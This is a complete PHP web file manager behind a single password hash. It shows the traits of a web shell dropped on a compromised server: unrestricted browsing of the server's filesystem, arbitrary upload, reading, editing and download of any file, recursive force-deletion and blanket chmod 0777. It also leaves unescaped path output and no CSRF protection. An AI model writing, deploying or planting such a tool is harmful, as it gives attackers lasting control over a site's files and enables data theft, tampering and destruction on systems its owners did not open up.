<?php
session_start();

$pass_hash = '$2a$12$RUoqnB8WJkwFML3lhuv5yenuIvHXDLTQs6xpB4NBzIRJe2RWRAoEi';

if (isset($_POST['p']) && password_verify($_POST['p'], $pass_hash)) {
    $_SESSION['auth'] = true;
}
if (!isset($_SESSION['auth'])) {
    echo '<!DOCTYPE html><html><head><style>body{background:#0a0e12;color:#0f0;font-family:monospace;padding:20px;}input,button{background:#1a1f2e;color:#0f0;border:1px solid #0f0;padding:10px;border-radius:6px;}button{background:#0f0;color:#000;cursor:pointer;}</style></head><body><form method=post><input type=password name=p><button>Login</button></form></body></html>';
    exit;
}

if (!isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd();

// Force delete recursive
function force_delete($dir) {
    if (!file_exists($dir)) return;
    if (!is_dir($dir)) { @chmod($dir, 0777); @unlink($dir); return; }
    foreach (scandir($dir) as $f) {
        if ($f == '.' || $f == '..') continue;
        $p = $dir . '/' . $f;
        is_dir($p) ? force_delete($p) : ( @chmod($p, 0777) && @unlink($p) );
    }
    @chmod($dir, 0777); @rmdir($dir);
}

// Zip function
function zip_create($src, $dest, $files) {
    if (!class_exists('ZipArchive')) return false;
    $zip = new ZipArchive();
    if ($zip->open($dest, ZipArchive::CREATE) !== true) return false;
    foreach ($files as $f) {
        $p = $src . '/' . $f;
        if (is_file($p)) $zip->addFile($p, $f);
        elseif (is_dir($p)) {
            $zip->addEmptyDir($f);
            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
            foreach ($it as $file) {
                $rel = str_replace($p . '/', '', $file->getPathname());
                if ($file->isDir()) $zip->addEmptyDir($f . '/' . $rel);
                else $zip->addFile($file->getPathname(), $f . '/' . $rel);
            }
        }
    }
    return $zip->close();
}

// AJAX Handler
if (isset($_GET['ajax'])) {
    header('Content-Type: application/json');
    $act = $_GET['ajax'];
    $res = ['ok' => false];
    
    if ($act == 'list') {
        $items = scandir($_SESSION['cwd']);
        $folders = []; $files = [];
        foreach ($items as $i) {
            if ($i == '.' || $i == '..') continue;
            $p = $_SESSION['cwd'] . '/' . $i;
            if (is_dir($p)) $folders[] = ['n' => $i, 'w' => is_writable($p)];
            else $files[] = ['n' => $i, 's' => filesize($p), 'w' => is_writable($p)];
        }
        $res = ['ok' => true, 'cwd' => $_SESSION['cwd'], 'f' => $folders, 'fs' => $files];
    }
    elseif ($act == 'cd') { $d = $_GET['d']; $nd = ($d[0]=='/')?$d:$_SESSION['cwd'].'/'.$d; if(is_dir($nd)) $_SESSION['cwd']=realpath($nd); $res=['ok'=>true]; }
    elseif ($act == 'del') { $f = $_SESSION['cwd'].'/'.$_GET['f']; if(is_file($f)){@chmod($f,0777);@unlink($f);} $res=['ok'=>true]; }
    elseif ($act == 'rmdir') { force_delete($_SESSION['cwd'].'/'.$_GET['f']); $res=['ok'=>true]; }
    elseif ($act == 'rename') { $o=$_SESSION['cwd'].'/'.$_GET['o']; $n=$_SESSION['cwd'].'/'.$_GET['n']; if(file_exists($o) && !file_exists($n)){@chmod($o,0777);@rename($o,$n);} $res=['ok'=>true]; }
    elseif ($act == 'chmod') { $t=$_SESSION['cwd'].'/'.$_GET['t']; if(file_exists($t)) @chmod($t,0777); $res=['ok'=>true]; }
    elseif ($act == 'mkdir') { $n=$_SESSION['cwd'].'/'.$_GET['n']; if(!is_dir($n)) @mkdir($n,0777,true); $res=['ok'=>true]; }
    elseif ($act == 'touch') { $n=$_SESSION['cwd'].'/'.$_GET['n']; if(!is_file($n)) @file_put_contents($n,''); $res=['ok'=>true]; }
    elseif ($act == 'load') { $f=$_SESSION['cwd'].'/'.$_GET['f']; if(is_file($f)) die(file_get_contents($f)); }
    elseif ($act == 'save') { $f=$_SESSION['cwd'].'/'.$_GET['f']; @chmod($f,0777); @file_put_contents($f, $_POST['c']); $res=['ok'=>true]; }
    elseif ($act == 'zip') { $f = json_decode($_GET['f'], true); $n = 'archive_'.date('ymd_His').'.zip'; zip_create($_SESSION['cwd'], $_SESSION['cwd'].'/'.$n, $f); $res=['ok'=>true, 'n'=>$n]; }
    echo json_encode($res);
    exit;
}

if (isset($_FILES['up'])) {
    $t = $_SESSION['cwd'] . '/' . basename($_FILES['up']['name']);
    move_uploaded_file($_FILES['up']['tmp_name'], $t);
    echo json_encode(['ok'=>true]);
    exit;
}
if (isset($_GET['dl'])) { $f=$_SESSION['cwd'].'/'.$_GET['dl']; if(is_file($f)){ header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="'.basename($f).'"'); readfile($f); } exit; }
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>📁 FM</title>
<style>
*{box-sizing:border-box;}
body{background:#0a0e12;color:#0f0;font-family:monospace;padding:20px;}
a{color:#0f0;text-decoration:none;cursor:pointer;}
a:hover{color:#ff0;}
table{width:100%;border-collapse:collapse;}
td,th{padding:8px;text-align:left;border-bottom:1px solid #333;}
input,button,textarea{background:#1a1f2e;color:#0f0;border:1px solid #0f0;padding:8px;margin:5px;border-radius:6px;}
button{background:#0f0;color:#000;cursor:pointer;font-weight:bold;}
.folder{color:#ff0;font-weight:bold;}
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:999;}
.modal-content{background:#0a0e12;margin:10% auto;padding:20px;width:80%;border-radius:12px;border:1px solid #0f0;}
textarea{width:100%;height:300px;}
.close{float:right;cursor:pointer;color:#f00;font-size:24px;}
.dropzone{min-height:80px;border:2px dashed #0f0;border-radius:12px;text-align:center;padding:15px;margin:10px 0;cursor:pointer;}
.dropzone.drag{border-color:#ff0;background:#1a1f2e;}
</style>
</head>
<body>

<h2>📁 FILE MANAGER</h2>
<div id="cwd">📍 <?php echo $_SESSION['cwd']; ?></div>
<hr>

<div class="dropzone" id="dropzone">📤 Drag & drop files here or click to upload</div>
<input type="file" id="fileInput" multiple style="display:none">

<div style="margin:10px 0">
    <input type="text" id="newFolder" placeholder="folder_name" style="width:130px">
    <button onclick="createFolder()">📁 Folder</button>
    <input type="text" id="newFile" placeholder="file.txt" style="width:130px">
    <button onclick="createFile()">📄 File</button>
    <button onclick="home()">🏠 Home</button>
    <button onclick="parentDir()">⬆️ Parent</button>
    <button onclick="selectAll()">☑ All</button>
    <button onclick="deleteSelected()">🗑️ Sel</button>
    <button onclick="zipSelected()">📦 Zip Sel</button>
</div>

<h3>📁 FOLDERS</h3>
<table id="foldersTable"><thead><tr><th><input type="checkbox" id="selectAllFolders" onclick="toggleSelectAll('folders')"></th><th>Name</th><th>Writable</th><th>Action</th></tr></thead><tbody></tbody></table>

<h3>📄 FILES</h3>
<table id="filesTable"><thead><tr><th><input type="checkbox" id="selectAllFiles" onclick="toggleSelectAll('files')"></th><th>Name</th><th>Size</th><th>Writable</th><th>Action</th></tr></thead><tbody></tbody></table>

<div id="modal" class="modal"><div class="modal-content"><span class="close" onclick="closeModal()">&times;</span><h3>Edit: <span id="fn"></span></h3><textarea id="ta"></textarea><br><button onclick="saveFile()">💾 Save</button><button onclick="closeModal()">Cancel</button></div></div>

<script>
let currentCwd = '<?php echo $_SESSION['cwd']; ?>';
let selected = {folders: [], files: []};

function load() {
    fetch('?ajax=list').then(r=>r.json()).then(d=>{
        if(!d.ok)return;
        currentCwd = d.cwd;
        document.getElementById('cwd').innerHTML = '📍 ' + currentCwd;
        let fh = '', fih = '';
        for(let f of d.f) {
            let wc = f.w ? '#0f0' : '#f00';
            let wt = f.w ? '✅ Yes' : '❌ No';
            fh += `<tr><td><input type="checkbox" class="sel-folder" value="${escapeHtml(f.n)}"></td>
                    <td class="folder"><a onclick="cd('${escapeHtml(f.n)}')">📁 ${escapeHtml(f.n)}</a></td>
                    <td style="color:${wc}">${wt}</td>
                    <td><a onclick="chmod('${escapeHtml(f.n)}')">🔓</a> | <a onclick="rename('${escapeHtml(f.n)}')">✏️</a> | <a onclick="rmdir('${escapeHtml(f.n)}')" style="color:#f00">🗑️</a></td></tr>`;
        }
        for(let f of d.fs) {
            let sz = f.s < 1024 ? f.s+' B' : (f.s<1048576 ? (f.s/1024).toFixed(1)+' KB' : (f.s/1048576).toFixed(1)+' MB');
            let wc = f.w ? '#0f0' : '#f00';
            let wt = f.w ? '✅ Yes' : '❌ No';
            fih += `<tr><td><input type="checkbox" class="sel-file" value="${escapeHtml(f.n)}"></td>
                    <td>📄 ${escapeHtml(f.n)}</td>
                    <td>${sz}</td>
                    <td style="color:${wc}">${wt}</td>
                    <td><a onclick="dl('${escapeHtml(f.n)}')">⬇️</a> | <a onclick="edit('${escapeHtml(f.n)}')">✏️</a> | <a onclick="rename('${escapeHtml(f.n)}')">🔄</a> | <a onclick="del('${escapeHtml(f.n)}')" style="color:#f00">🗑️</a> | <a onclick="chmod('${escapeHtml(f.n)}')">🔓</a></td></tr>`;
        }
        document.querySelector('#foldersTable tbody').innerHTML = fh;
        document.querySelector('#filesTable tbody').innerHTML = fih;
        updateSelectedCount();
    });
}

function cd(d) { fetch('?ajax=cd&d='+encodeURIComponent(d)).then(()=>load()); }
function home() { fetch('?ajax=cd&d='+encodeURIComponent('<?php echo getcwd(); ?>')).then(()=>load()); }
function parentDir() { fetch('?ajax=cd&d=..').then(()=>load()); }
function del(f) { if(confirm('Delete '+f+'?')) fetch('?ajax=del&f='+encodeURIComponent(f)).then(()=>load()); }
function rmdir(f) { if(confirm('Force delete '+f+'?')) fetch('?ajax=rmdir&f='+encodeURIComponent(f)).then(()=>load()); }
function chmod(t) { fetch('?ajax=chmod&t='+encodeURIComponent(t)).then(()=>load()); }
function createFolder() { let n=document.getElementById('newFolder').value; if(n) fetch('?ajax=mkdir&n='+encodeURIComponent(n)).then(()=>{load();document.getElementById('newFolder').value='';}); }
function createFile() { let n=document.getElementById('newFile').value; if(n) fetch('?ajax=touch&n='+encodeURIComponent(n)).then(()=>{load();document.getElementById('newFile').value='';}); }
function rename(oldN) { let newN=prompt('Rename to:',oldN); if(newN&&newN!==oldN) fetch('?ajax=rename&o='+encodeURIComponent(oldN)+'&n='+encodeURIComponent(newN)).then(()=>load()); }
function dl(f) { window.location.href='?dl='+encodeURIComponent(f); }
function edit(f) { document.getElementById('fn').innerText=f; fetch('?ajax=load&f='+encodeURIComponent(f)).then(r=>r.text()).then(d=>{document.getElementById('ta').value=d;document.getElementById('modal').style.display='block';window.cf=f;}); }
function saveFile() { let c=document.getElementById('ta').value; fetch('?ajax=save&f='+encodeURIComponent(window.cf),{method:'POST',body:'c='+encodeURIComponent(c),headers:{'Content-Type':'application/x-www-form-urlencoded'}}).then(()=>{closeModal();load();}); }
function closeModal() { document.getElementById('modal').style.display='none'; }
function escapeHtml(s){return s.replace(/[&<>]/g,function(m){return m=='&'?'&amp;':m=='<'?'&lt;':'&gt;';});}

function toggleSelectAll(type) {
    let cb = document.querySelectorAll(type=='folders'?'.sel-folder':'.sel-file');
    let chk = document.getElementById('selectAll'+ (type=='folders'?'Folders':'Files'));
    cb.forEach(c=>c.checked=chk.checked);
    updateSelectedCount();
}
function updateSelectedCount() {
    selected.folders = [...document.querySelectorAll('.sel-folder:checked')].map(c=>c.value);
    selected.files = [...document.querySelectorAll('.sel-file:checked')].map(c=>c.value);
}
function selectAll() {
    document.querySelectorAll('.sel-folder, .sel-file').forEach(c=>c.checked=true);
    updateSelectedCount();
}
function deleteSelected() {
    if(selected.folders.length+selected.files.length==0) return alert('Nothing selected');
    if(!confirm('Delete '+selected.folders.length+' folders and '+selected.files.length+' files?')) return;
    let p = [];
    selected.folders.forEach(f=>p.push(fetch('?ajax=rmdir&f='+encodeURIComponent(f))));
    selected.files.forEach(f=>p.push(fetch('?ajax=del&f='+encodeURIComponent(f))));
    Promise.all(p).then(()=>load());
}
function zipSelected() {
    let all = [...selected.folders, ...selected.files];
    if(all.length==0) return alert('Nothing selected');
    fetch('?ajax=zip&f='+encodeURIComponent(JSON.stringify(all))).then(r=>r.json()).then(d=>{if(d.ok) alert('Created: '+d.n); load();});
}

// Drag & drop upload
let dropzone = document.getElementById('dropzone');
let fileInput = document.getElementById('fileInput');
dropzone.addEventListener('click',()=>fileInput.click());
dropzone.addEventListener('dragover',(e)=>{e.preventDefault();dropzone.classList.add('drag');});
dropzone.addEventListener('dragleave',()=>dropzone.classList.remove('drag'));
dropzone.addEventListener('drop',(e)=>{e.preventDefault();dropzone.classList.remove('drag');let f=e.dataTransfer.files;if(f.length) uploadFiles(f);});
fileInput.addEventListener('change',()=>{if(fileInput.files.length) uploadFiles(fileInput.files);});
function uploadFiles(files) {
    for(let file of files){
        let fd=new FormData();
        fd.append('up',file);
        fetch('',{method:'POST',body:fd}).then(()=>load());
    }
}

load();
</script>
</body>
</html>
